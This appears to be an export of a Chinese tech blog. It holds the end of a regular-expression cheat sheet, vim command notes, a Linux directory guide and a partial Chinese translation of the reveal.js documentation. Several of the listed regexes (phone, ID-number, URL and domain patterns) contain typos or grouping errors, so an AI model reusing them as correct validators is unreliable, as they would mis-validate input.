或 ^-?([1-9]\d*.\d*|0.\d*[1-9]\d*|0?.0+|0)$校验字符的表达式汉字 =&gt; ^[\u4e00-\u9fa5]{0,}$双子节字符（包括字符） =&gt; [^\x00-\xff]英文和数字 =&gt; ^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$长度为 3-20 的所有字符 =&gt; ^.{3,20}$由 26 个英文字母组成的字符串 =&gt; ^[A-Za-z]+$由 26 个大写英文字母组成的字符串 =&gt; ^[A-Z]+$由 26 个小写英文字母组成的字符串 =&gt; ^[a-z]+$由数字和 26 个英文字母组成的字符串 =&gt; ^[A-Za-z0-9]+$由数字、 26 个英文字母或者下划线组成的字符串 =&gt; ^\w+$ 或 ^\w{3,20}$中文、英文、数字包括下划线 =&gt; ^[\u4E00-\u9FA5A-Za-z0-9_]+$中文、英文、数字但不包括下划线等符号 =&gt; ^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$可以输入含有^%&amp;’,;=?$”等字符 =&gt; [^%&amp;&#39;,;=?$\x22]+禁止输入含有~的字符 =&gt; [^~\x22]+特殊需求表达式空白行 =&gt; \n\s*\rQQ 号码 =&gt; [1-9][0-9]{4,}邮政编号 =&gt; [1-9]\d{5}(?!\d)Email 地址 =&gt; ^([a-z0-9_\.-]+)@([\da-z\.-]+)\.([a-z\.]{2,6})$ 或者 ^[a-z\d]+(\.[a-z\d]+)*@([\da-z](-[\da-z])?)+(\.{1,2}[a-z]+)+$域名 =&gt; [a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?网址 URL =&gt; [a-zA-z]+://[^\s]* 或 ^//([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$ 或者 /^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/IP 地址 =&gt; ((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?) 或者 ^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$手机号码 =&gt; ^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX) =&gt; ^($$\d{3,4}-)|\d{3.4}-)?\d{7,8}$国内电话号码(0511-4405222、021-87888822) =&gt; \d{3}-\d{8}|\d{4}-\d{7}身份证号(15 位、18 位数字) =&gt; ^\d{15}|\d{18}$短身份证号码(数字、字母 x 结尾) =&gt; ^([0-9]){7,18}(x|X)?$ 或 ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$身份证号(18 位数字) =&gt; ^(\d{6})(\d{4})(\d{2})(\d{2})(\d{3})([0-9]|X)$帐号是否合法(字母开头,允许 5-16 字节,允许字母数字下划线) =&gt; ^[a-zA-Z][a-zA-Z0-9_]{4,15}$密码(以字母开头,长度在 6~18 之间,只能包含字母、数字和下划线) =&gt; ^[a-zA-Z]\w{5,17}$强密码(必须包含大小写字母和数字的组合,不能使用特殊字符,长度在 8-10 之间) =&gt; ^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$日期格式 =&gt; ^\d{4}-\d{1,2}-\d{1,2}一年的 12 个月(01 ～ 09 和 1 ～ 12) =&gt; ^(0?[1-9]|1[0-2])$一个月的 31 天(01 ～ 09 和 1 ～ 31) =&gt; ^((0?[1-9])|((1|2)[0-9])|30|31)$(年-月-日) 日期格式 =&gt; ([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})-(((0[13578]|1[02])-(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)-(0[1-9]|[12][0-9]|30))|(02-(0[1-9]|[1][0-9]|2[0-8])))HTML 标签 =&gt; //^&lt;([a-z]+)([^&lt;]+)*(?:&gt;(.*)&lt;\/\1&gt;|\s+\/&gt;)$//]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>RegExp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 学习笔记（二）：vim 的使用]]></title>
    <url>%2Farchives%2F1694930d.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的学习笔记系列第二篇,这一篇将介绍 vim 的使用技巧。vim 是一款终端编辑器,是由 vi 演变而来的,它与 vi 最大的区别是,vim 拥有代码高亮,其他操作都是共用的vim 常用操作打开文件操作命令作用vi进入 vi 而不读入任何文件vi [fileName]进入 vi 并读入指定名称的文件（新、旧文件均可）。vi +n [fileName]进入 vi 并且由文件的第几行开始。vi + [fileName]进入 vi 并且由文件的最后一行开始。vi +/pattern [fileName]打开文件,并将光标置于第一个与 pattern 匹配的串处vi [fileName]….[fileName]打开多个文件,依次进行编辑vi -r [fileName]在上次正用 vi 编辑时发生系统崩溃,恢复 [fileName]vimdiff fileA fileB比较编辑两个不同的文件vim 操作模式转换图插入命令命令作用a在光标所在行行尾插入i在光标所在字符前插入I在光标所在行行首插入o在光标下插入新行O在光标上插入新行定位命令命令作用:set nu设置行号:set nonu取消行号gg到第一行G到最后一行nG到第 n 行:n到第 n 行$光标移至行尾0光标移至行首删除命令命令作用x删除光标所在处字符nx删除光标所在处后 n 个字符dd删除光标所在行ndd删除 n 行dG删除光标所在行到文件末尾内容D删除光标所在处至行尾内容:n1,n2d删除第 n1 行到第 n2 行复制和剪切命令命令作用yy复制当前行nyy复制当前行（包含当前行）以下 n 行dd剪切当前行ndd剪切当前行（包含当前行）以下 n 行p粘贴在当前光标所在行的下一行P粘贴在当前光标所在行的上一行nyl复制 n 个字符yw复制一个单词y$复制从当前位置到行尾yG复制从所在行到最后一行:n1,n2 co n3将 n1 行到 n2 行之间的内容拷贝到第 n3+1 行【n3 行的下一行】:n1,n2 m n3将 n1 行到 n2 行之间的内容移至到第 n3 行下J把下一行的数据连接到本行之后替换和取消命令命令作用r取代光标所在处字符R从光标所在处开始替换字符,按 Esc 结束u取消上一步操作搜索和搜索替换命令命令作用/string搜索指定字符串:set ic搜索时忽略大小写:set noic取消搜索时忽略大小写n搜索指定字符串的下一个出现位置（即同方向）N在反方向上重复上一次搜索命令:%s/old/new/g全文替换指定字符串；需要替换询问时,g 改成 c:n1,n2s/old/new/g在一定方位范围内替换指定字符串；需要替换询问时,g 改成 c保存和退出命令命令作用:w保存修改:w /[path]/[fileName]另存为指定文件:wq,:x保存修改并退出ZZ快捷键,保存修改并退出:q!不保存修改并退出:wq!保存修改并退出（文件所有者及 root 可使用,通常在文件无写权限下使用）:n1,n2 w ! command将文件中 n1 行至 n2 行的内容作为 command 的输入并执行之,若不指定 n1,n2,则表示将整个文件内容作为 command 的输入【注意空格】例如 :1,4 w! grep tom:!command暂时退出 vi 并执行 shell 指令,执行完毕后再回到 vi。【后期应该有用】:r!command将命令 command 的输出结果放到当前行【强大】:sh暂时退出 vi 到系统下,结束时按 Ctrl + d 则回到 vi。:e [fileName]打开文件 [fileName] 进行编辑【相当于退出当前的并打开另一个文件】:e!放弃修改文件内容,重新载入该文件编辑:w !sudo tee %以普通用户身份打开的 vim ,修改后以 root 身份保存vim 使用技巧导入文件内容:r /[path]/[fileName] 导入命令执行结果:r !command 寻找命令所在目录:!which command 定义快捷键:map ^P I#&lt;ESC&gt; # 按 Ctrl+P 组合键用 # 注释当前行 :map ^B 0x # 按 Ctrl+B 组合键删除当前行的注释 :map ^H istring&lt;ESC&gt; # 按 Ctrl+H 组合键在光标所在位置插入字符串 :map 定义快捷键时,按 Ctrl+V+key 定义快捷键；:map 定义的快捷键,重启或关机失效连续行注释:n1,n2s/^/#/g # 在 n1 行到 n2 行首添加注释 # :n1,n2s/^#//g # 在 n1 行到 n2 行首删除注释 # :n1,n2s/^/\/\//g # 在 n1 行到 n2 行首添加注释 // :n1,n2s/^\/\//g # 在 n1 行到 n2 行首删除注释 // 替换:ab string1 string2 # 输入 string1 将会被替换成 string2 编辑模式命令,永久生效普通用户vim /home/[userName]/.vimrc root 用户vim /root/.vimrc 添加类似于以下命令代码,无需添加 :set nu map ^P I#&lt;ESC&gt; ab test this is test,this is test,this is test.]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 学习笔记（一）：目录结构说明]]></title>
    <url>%2Farchives%2F70bd1178.html</url>
    <content type="text"><![CDATA[接触了 Liunx 也有一段时间了,也算对 Liunx 有一定的了解,在这里将陆续的推出 Liunx 的学习笔记系列,做个记录,方便以后忘记有处可循。Liunx 是以文件系统为主的,所以 Liunx 下的每一个目录都有其各自的作用,则本篇将介绍 Liunx 的各个目录结构及其说明目录结构图目录结构说明目录说明/根目录。在 Windows,DOS 或者其他类似的操作系统里面,每个分区都会有一个相应的根目录。但是 Linux 和其他 UNIX 系统则把所有的文件都放在一个目录树里面,/ 就是唯一的根目录。一般来讲,根目录下面很少保存什么文件,或者只有一个内核映像在这里。/boot很多 Linux 系统把内核映像和其他一些和启动有关的文件都放在这里。/tmp一般只有启动时产生的临时文件才会放在这个地方。我们自己的临时文件都放在 /var/tmp。/mnt这个目录下面放着一些用来安装其他设备的子目录,比如说 /mnt/cdrom 或者 /mnt/floppy。在有些 Linux 中这个目录被 /mount 代替。/lib启动的时候所要用到的库文件都放在这个目录下。那些非启动用的库文件都会放在 /usr/lib 下。内核模块是放在 /lib/modules/ （内核版本）下的。/proc这个目录在磁盘上其实是不存在的。里面的文件都是关于当前系统的状态,包括正在运行的进程、硬件状态、内存使用的多少等。/dev这个目录下保存着所有的设备文件。里面有一些是由 Linux 内核创建的用来控制硬件设备的特殊文件。/var这里有一些被系统改变过的数据。比如说 /var/tmp,就是用来储存临时文件的。还有很多其他的进程和模块把它们的记录文件也放在这个地方,包括如下一些重要的子目录/var/log这里放着绝大部分的记录文件。随着时间的增长,这个目录会变得很庞大,所以要定期清理。/var/run包括了各种运行时的信息。/var/lib包括了一些系统运行时需要的文件。/var/spool邮件,新闻,打印序列的所在地。/rootroot 用户的主目录。/home一般用户的主目录都会放在这个目录下。在 Linux 下,可以通过 #cd ~ 来进入自己的主目录。/etc这里保存着绝大部分的系统配置文件。相对来讲,单个用户的系统配置文件会保存在这个用户自己的主目录里面。下面列举其中一些重要的子目录。/etc/X11这里放着 X 窗口系统（ Linux 中的图形用户界面系统）所需要的配置文件。XF86Config 就是把配置储存到这个地方的。/etc/X11/fonts 里面放着一些服务器需要的字体,还存放一些窗口管理器存放的配置文件。/etc/init.d这个目录保存着启动描述文件,包括各种模块和服务的加载描述。所以如果不清楚的话,千万不要随便删除其中的文件,这里存放的文件都是系统自动进行配置的,不需要用户配置。/etc/rcS.d这里放着一些连接到 /etc/init.d 的文件,根据 runlevel 的不同而执行相应的描述。这里的文件名都是由 S 来开头的,然后是一个两位的数字——表示各种服务启动的顺序。比如,S24foo 就是在 S42bar 前面执行的。接着就是相应的连接到 /etc/init.d 下面的文件名字了。/etc/rc0.d - /etc/rc6.d这里面也是一些连接文件,和 /etc/rcS.d 差不多。不同的是,这些只会在指定的 runlevel 下运行相应的描述。0 表示关机,6 表示重启。所有以 K开头的文件表示关闭,所有以 S 开头的文件表示重启。目前来讲,文件的命名方式和 /etc/rcS.d 是一样的。/bin,/sbin这里分别放着启动时所需要的普通程序和系统程序。很多程序在启动以后也很有用,它们放在这个目录下是因为它们经常要被其他程序调用。/usr这是一个很复杂、庞大的目录。除了上述目录之外,几乎所有的文件都存放在这下面。下面列举其中一些重要的子目录。/usr/X11R6,/usr/X11,/usr/Xfree86这里保存着 X 窗口系统所需要的文件,它的目录结构和 /usr 是一样的。/usr/bin二进制可执行文件存放的目录,这里放着绝大部分的应用程序。/usr/sbin这里放着绝大部分的系统程序。/usr/games游戏程序和相应的数据会放在这里。/usr/include这个目录保存着 C 和 C++ 的头文件。/usr/lib启动时用不到的库文件都会放在这里。/usr/info这里保存着 GNU Info 程序所需要的数据。/usr/man这里保存着 man 程序所需要的数据。/usr/src这里保存着源代码文件。/usr/doc这里保存着各种文档文件。这些文件可以帮助你了解 Linux,解决问题和提供一些技巧。/usr/local这里保存着本地计算机所需要的文件。在用户进行远程访问的时候特别有意义。这个目录在有些 Linux 系统下就是一个单独的分区,存放一些这台机子所属的那个用户的文件。里面的结构和 /usr 是一样的。/usr/shared,/usr/share这里保存着各种共享文件。]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[reveal.js（HTML 演示文稿）中文文档]]></title>
    <url>%2Farchives%2F8bdf06de.html</url>
    <content type="text"><![CDATA[最近发现了一个可以用 HTML+CSS3 就能做出一份优美的 PPT 的 JavaScript 框架（reveal.js）,但是我并没有找到该框架的中文帮助文档,所以在这里将提供中文帮助文档（本人的英文水平并不是很好,所以客官们凑合着看,顺便添加一些相关内容）英文帮助文档地址reveal.js 英文帮助文档reveal.js 介绍是什么？一个使用 HTML 轻松创建精美的演示文稿框架,你只要有一个支持 CSS 3D 切换的浏览器。。点击查看 demoreveal.js 配备了广泛的功能,包括嵌套幻灯片,Markdown 内容,PDF 导出,演讲笔记和 JavaScript API。还有一个全功能的可视化编辑器和平台：slides.com。特点支持标签来区分每一页幻灯片可以使用 Markdown 来写内容支持 PDF 的导出支持演说注释提供 JavaScript API 来控制页面提供了多个默认主题和切换方式幻灯片实现步骤从 reveal.js 上下载压缩包,并解压进入 reveal.js 文件夹,直接修改 index.html 文件就可以在线编辑演示文档是使用 HTML 或者 Markdown 编写的,如果你们更喜欢图形界面的在线编辑器,点击 slides.com 尝试一下。写法说明HTML 实现幻灯片的内容需要包含在 &lt;div class=&quot;reveal&quot;&gt; &lt;div class=&quot;slides&quot;&gt; 的标签中。一个 section 是一页幻灯片。当 section 包含在 section 中时,是一个纵向的幻灯片。实际上就是 .reveal &gt; .slides &gt; section 这样子结构的。怎么理解呢？ 可以这样理解：横向的幻灯片代表一章,纵向的幻灯片代表一章中的一节。那么横向的幻灯片在播放时是左右切换的,而纵向的幻灯片是上下切换的。For Example:&lt;html&gt; &lt;head&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/reveal.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/theme/white.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;reveal&quot;&gt; &lt;div class=&quot;slides&quot;&gt; &lt;section&gt;Slide 1&lt;/section&gt; &lt;section&gt;Slide 2&lt;/section&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;js/reveal.js&quot;&gt;&lt;/script&gt; &lt;script&gt; Reveal.initialize(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; HTML 实现内容标题和正文section 中的内容就是幻灯片的内容,你可以使用 h2 标签表示标题, p 表示内容。需要改变颜色的只需 style=“color: ”。当某一页需要特殊背景色,可以使用 data-background 在 section 上设置, data-background-transition 表示背景的过渡效果。For Example:&lt;section data-background-transition=&quot;zoom&quot; data-background=&quot;#dddddd&quot;&gt; &lt;section&gt; 如果需要正文一段一段出现。可以使用 fragment。For Example:&lt;p class=&quot;fragment&quot;&gt;&lt;/p&gt; 代码reveal.js 使用 highlight.js 来支持代码高亮。可以直接写 code 标签来实现, data-trim 表示去除多余的空格。For Example:&lt;pre&gt; &lt;code data-trim&gt; console.log(&#39;hello reveal.js!&#39;); &lt;/code&gt; &lt;/pre&gt; 注释在演示文稿里可能会用到注释,对于注释,可以通过 &lt;aside class=&quot;notes&quot;&gt; 来实现。For Example:&lt;aside class=&quot;notes&quot;&gt; &lt;!-- 这里是注释。 --&gt; &lt;/aside&gt; 在幻灯片页面,按下 s 键,就可以调出注释页面,注释页面包含了当前幻灯片,下一章幻灯片,注释,以及幻灯片播放时间。Markdown 实现reveal.js 不仅支持 html 表示来实现内容, 还可以通过 Markdown 来实现内容。使用 Markdown 实现内容时,需要对 section 标示添加 data-markdown 属性,然后将 Markdown 内容写到一个 text/template 脚本中。For Example:&lt;section data-markdown&gt; &lt;script type=&quot;text/template&quot;&gt; ## Page title A paragraph with some text and a [link](//hakim.se). &lt;/script&gt; &lt;/section&gt; 背景色fragment 功能的实现,可以通过注释来实现。 这是一个特殊的语法（在 HTML 中注释）。For Example:&lt;section data-markdown&gt; &lt;script type=&quot;text/template&quot;&gt; &lt;!-- .slide: data-background=&quot;#ff0000&quot; --&gt; - Item 1 &lt;!-- .element: class=&quot;fragment&quot; data-fragment-index=&quot;2&quot; --&gt; - Item 2 &lt;!-- .element: class=&quot;fragment&quot; data-fragment-index=&quot;1&quot; --&gt; &lt;/script&gt; &lt;/section&gt; 外置 Markdown 文件reveal.js 可以引用一个外置的 Markdown 文件来解析。data-charset 属性是可选的,它指定加载外部文件时使用的字符集。当在本地使用,此功能要求 reveal.js 从本地 Web 服务器中运行。本地 Web 服务器推荐使用 Node.js。For Example:&lt;section data-markdown=&quot;example.md&quot; data-separator=&quot;^\n\n\n&quot; data-separator-vertical=&quot;^\n\n&quot; data-separator-notes=&quot;^Note:&quot; data-charset=&quot;iso-8859-15&quot;&gt; &lt;/section&gt; 分页实现一个 Markdown 文件中可以连续包含多个章内容。可以在 section 中通过属性 data-separator, data-separator-vertical 来划分章节。For Example:&lt;section data-separator=&quot;---&quot; data-separator-vertical=&quot;--&quot; &gt; &lt;script type=&quot;text/template&quot;&gt; # 主题1 - 主题1-内容1 - 主题1-内容2 -- ## 主题1-内容1 内容1-细节1 -- ## 主题1-内容2 内容1-细节2 --- # 主题2 &lt;/script&gt; &lt;/section&gt; 注释对 section 添加 data-separator-notes=&quot;^Note:&quot; 属性,就可以指定 Note: 后面的内容为当前幻灯片的注释。For Example:# Title ## Sub-title Here is some content... Note: This will only display in the notes window. 基础配置项在页面的最后,你需要初始化一些配置项,请注意,所有的配置值是可选的。以下指定的内容,是默认的配置值,可以根据需求修改。Example Configuration:Reveal.initialize({ // 是否在右下角展示控制条 controls: true, // 是否显示演示的进度条 progress: true, // 是否显示当前幻灯片的页数编号,也可以使用代码 “slideNumber: &#39;c/t&#39;” ,表示当前页/总页数。 slideNumber: false, // 是否将每个幻灯片改变加入到浏览器的历史记录中去 history: false, // 是否启用键盘快捷键来导航 keyboard: true, // 是否启用幻灯片的概览模式,可使用 &quot;Esc&quot; 或 &quot;o&quot; 键来切换概览模式 overview: true, // 是否将幻灯片垂直居中 center: true, // 是否在触屏设备上启用触摸滑动切换 touch: true, // 是否循环演示 loop: false, // 是否将演示的方向变成 RTL,即从右往左 rtl: false, // 是否每次演示的时候,随机幻灯片的顺序 shuffle: false, // 全局开启和关闭碎片。 fragments: true, // 标识演示文稿是否在嵌入模式中运行,即包含在屏幕的有限部分中的 embedded: false, // 标识当问号键被点击的时候是否应该显示一个帮助的覆盖层 help: true, // 标识演讲者备注标志是否让所有观看者可见 showNotes: false, // 两个幻灯片之间自动切换的时间间隔（毫秒） // 当设置成 0 的时候则禁止自动切换 // 该值可以被幻灯片上的 “data-autoslide” 属性覆盖 autoSlide: 0, // 当遇到用户输入的时候停止自动切换 autoSlideStoppable: true, // 当自动滑动时,使用此方法进行导航。 autoSlideMethod: Reveal.navigateNext, // 是否启用通过鼠标滚轮来导航幻灯片 mouseWheel: false, // 是否在移动设备上隐藏地址栏 hideAddressBar: true, // 是否在一个弹出的 iframe 中打开幻灯片中的链接 previewLinks: false, // 切换过渡效果 transition: &quot;default&quot;, // none/fade/slide/convex/concave/zoom // 过渡速度 transitionSpeed: &quot;default&quot;, // default/fast/slow // 全屏幻灯片背景的过渡效果 backgroundTransition: &quot;default&quot;, // none/fade/slide/convex/concave/zoom // 加载除当前可见的幻灯片之外的幻灯片数量 viewDistance: 3, // 视差背景图片 parallaxBackgroundImage: &quot;&quot;, // e.g. &#39;//s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg&#39; // 视差背景尺寸 parallaxBackgroundSize: &quot;&quot;, // CSS syntax, e.g. &quot;2100px 900px&quot; // 移动视差背景（水平和垂直）滑动变化的数量, 例如 100 // - 除了指定自动计算 // - 设置为 0 时,禁止沿轴运动 parallaxBackgroundHorizontal: null, parallaxBackgroundVertical: null }); 这些配置使用 configure 方法将会被更新。For Example:// 关闭自动切换 Reveal.configure({ autoSlide: 0 }); // 开启每 5 秒自动切换一次 Reveal.configure({ autoSlide: 5000 }); 演示文稿的大小所有的演示稿都有一个正常大小,这是他们所撰写的分辨率。该框架统一在此基础上自动缩放并规模演示,确保一切都适合任何于给定的屏幕上。见下文的相关的大小配置选项,包括默认值的列表。Example Configuration:Reveal.initialize({ ... // 演示稿的“正常”的大小。 // 当演示稿被缩放时,将会适应不同的分辨率,而宽高比也将会被保留。 // 可以用百分比单位指定。 width: 960, height: 700, // 显示大小应该考虑到在内容的外围保留一些空白。 margin: 0.1, // 应用到内容的最大最小的设置项 minScale: 0.2, maxScale: 1.5 }); 依赖Reveal.js 不依赖于任何第三方的脚本,但一些可选库默认被包含。这些库在它们被加载时出现。For Example:Reveal.initialize({ dependencies: [ // 完全实现跨浏览器：classList // https://github.com/eligrey/classList.js/ { src: &quot;lib/js/classList.js&quot;, condition: function() { return !document.body.classList; } }, // 在 section 标签中解读 Markdown { src: &quot;plugin/markdown/marked.js&quot;, condition: function() { return !!document.querySelector(&quot;[data-markdown]&quot;); } }, { src: &quot;plugin/markdown/markdown.js&quot;, condition: function() { return !!document.querySelector(&quot;[data-markdown]&quot;); } }, // 在 code 标签中高亮代码 { src: &quot;plugin/highlight/highlight.js&quot;, async: true, callback: function() { hljs.initHighlightingOnLoad(); } }, // 按住 Alt+点击 实现放大和缩小 { src: &quot;plugin/zoom-js/zoom.js&quot;, async: true }, // 演讲者备注 { src: &quot;plugin/notes/notes.js&quot;, async: true }, // MathJax { src: &quot;plugin/math/math.js&quot;, async: true } ] }); 你可以使用相同的语法添加自己的扩展。以下属性可用于每个依赖的对象当中：src: 脚本加载的路径。async: 是否异步,可选标志。本是否在 reveal.js 之后开始加载,默认值为 false。callback: 回调方法,可选方法。当脚本加载是执行。condition: 返回条件 ,可选方法。为要加载的脚本返回 true。Ready 事件当 reveal.js 已加载了所有非异步的依赖,并准备开始导航时被 ready 事件被触发。 要检查 reveal.js 是否已经 ready,你可以调用 Reveal.isReady() 方法。For Example:Reveal.addEventListener(&quot;ready&quot;, function(event) { // event.currentSlide, event.indexh, event.indexv }); 自动滑动演示文稿可以配置为通过自动滑动,而无需用户的任何输入。为了启用这个,你需要告诉框架幻灯片之间应该间隔多少毫秒进行切换。For Example:// 5 秒切换间隔 Reveal.configure({ autoSlide: 5000 }); 当启用时,会出现让用户可以暂停和恢复自动滑动的控件。另外,滑动可以按键盘上 A 键进行恢复和暂停。用户开始手动导航时就会自动暂停滑动。你可以通过 reveal.js 的配置项指定禁用控件：autoSlideStoppable: false。你也可以在幻灯片上设置 data-autoslide 属性进行覆盖。For Example:&lt;section data-autoslide=&quot;2000&quot;&gt; &lt;p&gt;After 2 seconds the first fragment will be shown.&lt;/p&gt; &lt;p class=&quot;fragment&quot; data-autoslide=&quot;10000&quot;&gt; After 10 seconds the next fragment will be shown. &lt;/p&gt; &lt;p class=&quot;fragment&quot;&gt; Now, the fragment is displayed for 2 seconds before the next slide is shown. &lt;/p&gt; &lt;/section&gt; 要覆盖用于当自动滑动导航的方法,你可以指定 autoSlideMethod 的设置项。市值只能沿着头层导航而忽略垂直滑动,这里可以设置为：Reveal.navigateRight。每当自动幻灯片模式恢复或者暂停时,autoslideresumed 和 autoslidepaused 事件会被释放。键盘绑定如果你不满意任何默认键盘绑定的,你可以使用 keyboard 配置选项来覆盖它们。For Example:Reveal.configure({ keyboard: { 13: &quot;next&quot;, // 按下 Enter 键切入下一张幻灯片 27: function() {}, // 当 Esc 键被按下时执行的方法 32: null // 当按下 SPACE 键时没有做任何事情（即禁用 reveal.js 默认绑定） } }); 触摸导航你可以通过在任何支持触摸的设备上滑动来演示导航。支持水平和垂直滑动实现幻灯片之间切换。如果你希望禁用这个功能,可以在初始化 reveal.js设置：touch: false。如果有你的内容的某些部分仍然可以访问触摸事件,你需要在元素中添加 data-prevent-swipe 属性来突出这个。一个非常有用的元素需要被滚动是个常见的例子。延迟加载在演示文稿时,大量的媒体文件或者 iframe 里的内容,被延迟加载是很重要的。延迟加载意味着 reveal.js 只会加载当前幻灯片最接近的几张幻灯片内容。被预加载的幻灯片是由配置项中的 viewDistance 的值所决定的。要启用延迟加载,你需要在 data-src 中改变 src 属性。这是支持 image,video,audio和 iframe 元素。当包含不再长时间可见的幻灯片,延时加载的 iframes 将会被卸载。For Example:&lt;section&gt; &lt;img data-src=&quot;image.png&quot;&gt; &lt;iframe data-src=&quot;//hakim.se&quot;&gt;&lt;/iframe&gt; &lt;video&gt; &lt;source data-src=&quot;video.webm&quot; type=&quot;video/webm&quot;&gt; &lt;source data-src=&quot;video.mp4&quot; type=&quot;video/mp4&quot;&gt; &lt;/video&gt; &lt;/section&gt; APIReveal 对象公布了 JavaScript API 用来控制导航和阅读状态。JavaScript API// 导航 Reveal.slide(indexh, indexv, indexf); Reveal.left(); Reveal.right(); Reveal.up(); Reveal.down(); Reveal.prev(); Reveal.next(); Reveal.prevFragment(); Reveal.nextFragment(); // 随机幻灯片的顺序 Reveal.shuffle(); // 切换演示状态,通过 true/false 来控制 开/关 Reveal.toggleOverview(); Reveal.togglePause(); Reveal.toggleAutoSlide(); // 在运行时改变一个配置值 Reveal.configure({ controls: true }); // 返回当前的配置值 Reveal.getConfig(); // 获取当前演示文稿的规模,即大小 Reveal.getScale(); // 检索之前和当前幻灯片元素 Reveal.getPreviousSlide(); Reveal.getCurrentSlide(); Reveal.getIndices();// { h: 0, v: 0 } } Reveal.getProgress();// 0-1 Reveal.getTotalSlides(); // 返回演讲者当前幻灯片的备注 Reveal.getSlideNotes(); // 返回当前状态 Reveal.isFirstSlide(); Reveal.isLastSlide(); Reveal.isOverview(); Reveal.isPaused(); Reveal.isAutoSliding(); 幻灯片更改事件&#39;slidechanged&#39; 事件在每次幻灯片滑动时被释放（无论什么状态）。这个事件对象包含当前幻灯片的索引值,以及之前和当前幻灯片的 HTML 节点作为参考。一些库,如 MathJax（见 #226）,可以获取幻灯片的变化和显示状态带来的困惑。很多时候,可以在回调中通过调用更新或者给予方法来确立。For Example:Reveal.addEventListener(&quot;slidechanged&quot;, function(event) { // event.previousSlide, event.currentSlide, event.indexh, event.indexv }); 演示状态演示文稿的当前状态可以通过使用的 getState 方法获取。state 对象包含着后面所有演示所需的信息,因此它第一次被称为 getSate。这有一点像快照。它可以很容易地字符串化和持久化或通过网络发送一个简单的对象。For Example:Reveal.slide(1); // we&#39;re on slide 1 var state = Reveal.getState(); Reveal.slide(3); // we&#39;re on slide 3 Reveal.setState(state); // we&#39;re back on slide 1 幻灯片状态如果你在幻灯片的 section 中设置 data-state=&quot;somestate&quot;,当幻灯片被打开时,&quot;somestate&quot; 将会应用一个 class 在文档元素上。这允许你使用广泛的样式变化应用到基于活动的幻灯片页面。此外,你还可以通过 JavaScript 监听这些变化状态。For Example:Reveal.addEventListener( &quot;somestate&quot;, function() { // TODO: Sprinkle magic }, false ); 幻灯片背景幻灯片默认包含在屏幕的有限范围之内,这允许其适应任何的显示屏幕并且均匀的缩放。你可以在 section 元素上添加 data-background 属性,定义幻灯片区域之外的整页背景。拥有四种不同类型的背景支持：color, image, video 和 iframe。颜色背景所有 CSS 颜色都将支持,如 rgba() 或者 hsl()。For Example:&lt;section data-background-color=&quot;#ff0000&quot;&gt; &lt;h2&gt;Color&lt;/h2&gt; &lt;/section&gt; 图片背景默认情况下,背景图片将会缩放至覆盖整个页面。可用选项：AttributeDefaultDescriptiondata-background-image显示图像的 URL 地址。当幻灯片打开时,GIF 重新启动。data-background-sizecover在 MDN 上查看 background-sizedata-background-positioncenter在 MDN 上查看 background-positiondata-background-repeatno-repeat在 MDN 上查看 background-repeatFor Example:&lt;section data-background-image=&quot;//example.com/image.png&quot;&gt; &lt;h2&gt;Image&lt;/h2&gt; &lt;/section&gt; &lt;section data-background-image=&quot;//example.com/image.png&quot; data-background-size=&quot;100px&quot; data-background-repeat=&quot;repeat&quot;&gt; &lt;h2&gt;This background image will be sized to 100px and repeated&lt;/h2&gt; &lt;/section&gt; 视频背景在幻灯片背后上自动播放全尺寸的视频。属性默认值描述data-background-video单个视频源,或者使用逗号分隔的视频源列表data-background-video-loopfalse设置视频是否重复播放data-background-video-mutedfalse设置视频是否静音For Example:&lt;section data-background-video=&quot;//s3.amazonaws.com/static.slid.es/site/homepage/v1/homepage-video-editor.mp4,//s3.amazonaws.com/static.slid.es/site/homepage/v1/homepage-video-editor.webm&quot; data-background-video-loop data-background-video-muted&gt; &lt;h2&gt;Video&lt;/h2&gt; &lt;/section&gt; Iframe 背景嵌入了网页作为背景。请注意,由于 iframe 是在背景层,即幻灯片的后面,我们是不可能与嵌入式网页交互。For Example:&lt;section data-background-iframe=&quot;//slides.com&quot;&gt; &lt;h2&gt;Iframe&lt;/h2&gt; &lt;/section&gt; 背景切换默认情况下,使用一个渐变的动画背景进行过渡。这可以在 Reveal.initialize() 申明 backgroundTransition: &#39;slide&#39; 改变滑动过渡效果,另外,你可以在 section 中指定 data-background-transition,衣服该指定的背景过渡。视差背景如果你想使用视差滚动背景,可以在 reveal.js 初始化设置下面前两项（另外两个是可选的）。Example Configuration:Reveal.initialize({ // 视差背景图片地址 